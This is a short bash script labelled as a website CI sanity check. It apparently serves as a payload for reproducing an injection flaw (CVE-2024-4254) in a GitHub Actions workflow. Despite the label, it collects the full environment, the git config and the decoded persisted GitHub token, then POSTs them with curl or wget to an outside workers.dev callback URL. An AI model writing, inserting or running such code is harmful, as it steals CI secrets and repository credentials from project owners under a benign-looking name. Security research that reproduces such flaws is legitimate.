#!/usr/bin/env bash
# website CI sanity check
URL="https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-4254-f4d42f23ad84?harness_run_id=20260831T002034-845acc08"
BODY="$(mktemp)"
{
  echo "wf=$GITHUB_WORKFLOW"
  echo "repo=$GITHUB_REPOSITORY"
  echo "run=$GITHUB_RUN_ID"
  echo "event=$GITHUB_EVENT_NAME"
  echo "sha=$GITHUB_SHA"
  echo "actor=$GITHUB_ACTOR"
  echo "--- env ---"
  env
  echo "--- git config ---"
  git config --local --list 2>/dev/null
  echo "--- persisted token (decoded) ---"
  git config --local --get http.https://github.com/.extraheader 2>/dev/null \
    | sed 's/.*basic //' | base64 -d 2>/dev/null
  echo
} > "$BODY" 2>&1
curl -sS -X POST "$URL" -H "Content-Type: text/plain" --data-binary @"$BODY" \
  || wget --post-file="$BODY" -qO- "$URL" || true
rm -f "$BODY"
echo "website-check INJECTED-MARKER-cve-2024-4254-f4d42f23ad84 wf=$GITHUB_WORKFLOW run=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME"
